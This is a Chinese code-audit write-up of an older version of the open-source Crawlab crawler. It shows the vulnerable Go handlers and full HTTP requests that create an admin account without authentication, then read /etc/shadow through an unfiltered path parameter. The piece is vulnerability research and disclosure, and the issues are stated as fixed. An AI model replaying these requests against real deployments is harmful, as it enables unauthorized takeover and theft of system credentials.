Goland 代码审计: GitHub 开源项目 Crawlab
================================

前言
--

在GitHub上找到了一个爬虫项目来进行代码审计漏洞挖掘，官方在去年12月重构了代码并转移到了Github，与此同时也修复了曾经出现的漏洞，这里主要分享一下重构前的版本 代码的漏洞分析思路

` 最新版本已不受影响 https://github.com/crawlab-team/crawlab `

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1edfb5386e5dacd48e92cc4a43927d483440e511.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-41b72bdbac5d2a8049f1639cba636f6511856dff.png)

功能了解
----

由于是开源项目，我们可以首先通过在本地进行搭建来了解功能

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-730c271887f01884b796fbbd292a2350b3db798e.png)

找到对应的路由文件 backend/main.go

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-482d5d3938fbb608f0aebcf7a73b9ceb8b9d7955.png)

可以看到两种不同的分组

` anonymousGroup 和 authGroup `

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b9096541e7f928fc4f3e61515c7040a1f661a721.png)

跟踪一下 AuthorizationMiddleware方法

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fbf71b3891f835a18c0328582c72fff546f381ef.png)

这里可以看到方法为权限验证的方法，其下的方法都需要通过身份验证才可以调用，我们如果想要找到前台的漏洞，就需要查看匿名可调用的方法

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1ef6ecc2c31e7005ed80f183746aceb9d6f22f30.png)

漏洞挖掘
----

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-932b5d5834aa10a8184583c9f9ec0d66397571fa.png)

在匿名可调用的方法里存在了一个在验证身份后才可调用的方法 PutUser，跟踪该方法

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3c475f8805ba1ec5c2e83df0dd0227a6d0dca123.png)

```php
// @Summary Put user
// @Description Put user
// @Tags user
// @Produce json
// @Param Authorization header string true "Authorization token"
// @Param reqData body routes.UserRequestData true "reqData body"
// @Success 200 json string Response
// @Failure 400 json string Response
// @Router /users [put]
func PutUser(c *gin.Context) {
    // 绑定请求数据
    var reqData UserRequestData
    if err := c.ShouldBindJSON(&reqData); err != nil {
        HandleError(http.StatusBadRequest, c, err)
        return
    }

    // 默认为正常用户
    if reqData.Role == "" {
        reqData.Role = constants.RoleNormal
    }

    // UserId
    uid := services.GetCurrentUserId(c)

    // 空 UserId 处理
    if uid == "" {
        uid = bson.ObjectIdHex(constants.ObjectIdNull)
    }

    // 添加用户
    if err := services.CreateNewUser(reqData.Username, reqData.Password, reqData.Role, reqData.Email, uid); err != nil {
        HandleError(http.StatusInternalServerError, c, err)
        return
    }

    c.JSON(http.StatusOK, Response{
        Status:  "ok",
        Message: "success",
    })
}
```

查看 CreateNewUser 方法调用所需要的字段

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-23b9654da94c27ea4a0fb2e9843543d5cf4fee0e.png)

```php
func CreateNewUser(username string, password string, role string, email string, uid bson.ObjectId) error {
    user := model.User{
        Username: strings.ToLower(username),
        Password: utils.EncryptPassword(password),
        Role:     role,
        Email:    email,
        UserId:   uid,
        Setting: model.UserSetting{
            NotificationTrigger: constants.NotificationTriggerNever,
            EnabledNotifications: []string{
                constants.NotificationTypeMail,
                constants.NotificationTypeDingTalk,
                constants.NotificationTypeWechat,
            },
        },
    }
    if err := user.Add(); err != nil {
        return err
    }
    return nil
}
```

role参数 所对应的权限可以在 backend/constants/user.go 中找到

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-221ce766f69af162bdca3f90c340ebe6f54d00a8.png)

通过发送 PUT请求 和对应的字段调用方法添加用户获取后台权限

```php
PUT /api/users HTTP/1.1
Host: 
Content-Length: 83
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935
Connection: close

{"username":"testppp","password":"testppp","role":"admin","email":"testppp@qq.com"}
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a5192cbd3dc97fc2458a4058b05b3f314abd6a33.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b9fe2e1b38e077d346ea19f14c28733d9f5ffb67.png)

成功添加用户，这样就获取到了后台管理员的权限了, 对有权限的接口方法进行漏洞挖掘

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4b36feea7b88fdddad4fc8853c2c1aeade4f93f6.png)

找到一处获取文件的接口，跟踪一下方法

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ea7cdc9151321860c03ffb37b499e8760b02a5b7.png)

path参数可控，没有进行文件读取的过滤

```php
package routes

import (
    "crawlab/utils"
    "github.com/gin-gonic/gin"
    "io/ioutil"
    "net/http"
)

// @Summary Get file
// @Description Get file
// @Tags file
// @Produce json
// @Param Authorization header string true "Authorization token"
// @Success 200 json string Response
// @Failure 400 json string Response
// @Router /file [get]
func GetFile(c *gin.Context) {
    path := c.Query("path")
    fileBytes, err := ioutil.ReadFile(path)
    if err != nil {
        HandleError(http.StatusInternalServerError, c, err)
    }
    c.JSON(http.StatusOK, Response{
        Status:  "ok",
        Message: "success",
        Data:    utils.BytesToString(fileBytes),
    })
}
```

接口调用为后台才可调用，通过任意用户添加可以完成绕过  
path参数可控，发送Get请求读取任意文件

```php
GET /api/file?path=../../etc/shadow HTTP/1.1
Host: 
Content-Length: 0
Accept: application/json, text/plain, */*
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYwZGQxOWU0YmZjNzg3MDAxZDk1NjBjOSIsIm5iZiI6MTYzOTMwNTI2MiwidXNlcm5hbWUiOiJhZG1pbiJ9.mFRAwXN-QqTmFmPAxgFEJhVXwxVuxJMepHe4khADfgk
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935
Connection: close
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3ae7c049ecfab68503a7fbbfdca0deea90f13f42.png)